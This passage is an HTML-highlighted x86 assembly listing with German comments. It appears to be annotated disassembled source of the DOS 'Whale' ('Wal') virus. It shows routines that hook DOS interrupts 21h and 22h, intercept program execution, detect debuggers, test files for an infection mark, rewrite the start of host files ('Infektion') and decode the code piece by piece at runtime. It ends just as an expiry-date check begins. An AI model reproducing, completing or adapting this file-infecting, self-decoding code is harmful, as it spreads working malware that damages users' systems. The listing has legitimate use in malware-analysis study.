                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CALLERs FLAGS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Caller-CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E6</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Caller-IP</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Dword</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">               </span><span class="sc1">; SET INT 22 TO CALLER</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">                            </span><span class="sc1">; POP Original-Flags</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; POP RET-Adresse</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24FF</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; SP-INIT</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2501</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; SS-INIT</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">42</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2503</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EXEC Programm</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============( Datei ist infiziert. Wal desinfiziert sie im RAM )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;       Offset 100H     JMP     4BCC = E9 C9 4A</span><span class="sc0">
</span><span class="sc1">;       Offset 2814     EXE_ID         E9 pq rs , Savebytes</span><span class="sc0">
</span><span class="sc1">;       Offset 4BCC     Vir-Entry</span><span class="sc0">
</span><span class="sc1">;       2814-4AC9-100h = DC4B usw.</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J034AF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">43</span><span class="sc0">                      </span><span class="sc1">; SI zeigt auf COM-START</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Sprungziel nach BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0DC4Bh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; -23B5, Diff -3  zw.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">;  Savebytes und 4BCC</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0DC4Dh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; -23B3</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0DC4Fh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; -2361</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J045D0</span><span class="sc0">                  </span><span class="sc1">; 'aktiv-msg'</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">43</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0345F</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================(   EINTRITT IN "ARBEITSPHASE"   )===</span><span class="sc0">
</span><span class="sc1">;================================( Durch die erste Anweisung wird )===</span><span class="sc0">
</span><span class="sc1">;================================( der JMP zum Relokator erzeugt  )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J034D4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">SwapCode_2</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">
                                        </span><span class="sc1">; JMP bei 3A20 erzeugen !!</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">              </span><span class="sc1">; BP = 20h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">        </span><span class="sc1">; Das nÑchste RET macht wieder</span><span class="sc0">
                                        </span><span class="sc1">; "PUSH BX,RET"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">           </span><span class="sc1">; BX = DS</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">           </span><span class="sc1">; BX = DS or 20h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; DS = DS or 20H</span><span class="sc0">

</span><span class="sc5">J034E4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; BX = BX * 16</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J034E4</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; AX = 0</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001Ch</span><span class="sc0">        </span><span class="sc1">; CX = 1C</span><span class="sc0">

</span><span class="sc5">J034ED</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J034ED</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">; AX auf den Stack</span><span class="sc0">
 
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03919</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================================( Gehîrt zu EXEC )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J034FC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; AX = 4B01 ( durch Debugger und Wal )</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03510</span><span class="sc0">  </span><span class="sc1">; ja  , durch Debugger und Wal.</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B8B</span><span class="sc0">  </span><span class="sc1">; nein, AX=4B03. Low-int-21h rufen</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===========================================================(trash)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03503</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc0">
        </span><span class="sc1">;---------------------------------------</span><span class="sc0">
        </span><span class="sc1">;J03503:ADD     BX,CX</span><span class="sc0">
        </span><span class="sc1">;       CMP     BX,2834h        ; OFFSET VIR_NAME</span><span class="sc0">
        </span><span class="sc1">;       JB      J03503</span><span class="sc0">
        </span><span class="sc1">;       XOR     CX,2121h        ; "!!"</span><span class="sc0">
        </span><span class="sc1">;       MOV     AX,WORD PTR DS:[30E8h]</span><span class="sc0">
        </span><span class="sc1">;       STD</span><span class="sc0">
        </span><span class="sc1">;       SUB     [BX+SI],AL</span><span class="sc0">
        </span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================================( EXEC mit 4B01h   )===</span><span class="sc0">
</span><span class="sc1">;==============================================( Aufruf durch WAL )===</span><span class="sc0">
</span><span class="sc1">;==============================================( und Debugger     )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03510</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">44</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc0">  </span><span class="sc4">],+</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; CALLERS Flags</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2424</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">        </span><span class="sc1">; EPB sichern</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2424</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; int 21h rufen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2424</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; EPB zurÅck</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; CS:IP holen</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">44</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J03542</span><span class="sc0">          </span><span class="sc1">; ---&gt; Infektion</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J035E0</span><span class="sc0">          </span><span class="sc1">; ---&gt; fertig</span><span class="sc0">
</span><span class="sc1">;=========================================================()========</span><span class="sc0">
</span><span class="sc5">J03542</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc1">; CF lîschen</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; ist IP-INIT=1 (infiziert)</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0358E</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">45</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">5348h</span><span class="sc0">                </span><span class="sc1">; "SH"</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">4649h</span><span class="sc0">                </span><span class="sc1">; "FI"</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">45</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J035C3</span><span class="sc0">          </span><span class="sc1">; nicht markierbar, keine Infektion</span><span class="sc0">
                </span><span class="sc1">;---------------------( Dateianfang manipulieren )---</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">46</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0DC4Bh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; SIEHE 34af!</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0DC4Dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0DC4Fh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">46</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J035C3</span><span class="sc0">    </span><span class="sc1">; Terminate-Adresse festlegen</span><span class="sc0">

</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================( Datei ist schon infiziert )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0358E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">47</span><span class="sc0">                      </span><span class="sc1">; ES:BX = EPB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">001Ah</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DS:SI = CS:IP der Datei</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_Current_PSP</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@PSP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0018h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0012h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0014h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">47</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================( Installation des INT 22-Handlers )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J035C3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_Current_PSP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@PSP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ah</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; OFFSET int 22-Handler</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Segment int 22-Handler</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">48</span><span class="sc0">
</span><span class="sc5">J035E0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; Fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================( kann ja fast nicht sein ...)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">; erzeugt wird :</span><span class="sc0">
</span><span class="sc1">;       DB      01h</span><span class="sc0">
</span><span class="sc1">;       DW      CS</span><span class="sc0">
</span><span class="sc1">;       DW      SS</span><span class="sc0">
</span><span class="sc1">;       DW      SP</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J035E3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">023Ah</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">;2a4a</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">023Ch</span><span class="sc4">],</span><span class="sc8">SS</span><span class="sc0">          </span><span class="sc1">;2a4c</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">023Eh</span><span class="sc4">],</span><span class="sc8">SP</span><span class="sc0">          </span><span class="sc1">;2a4e</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0239h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">;2a49</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                              </span><span class="sc1">; ist auch bloss MÅll !</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================( Kontrolle des Verfalls-Datums )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Check_Verfallsdatum</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">49</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">          </span><span class="sc1">; GET System Time &amp; Date</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
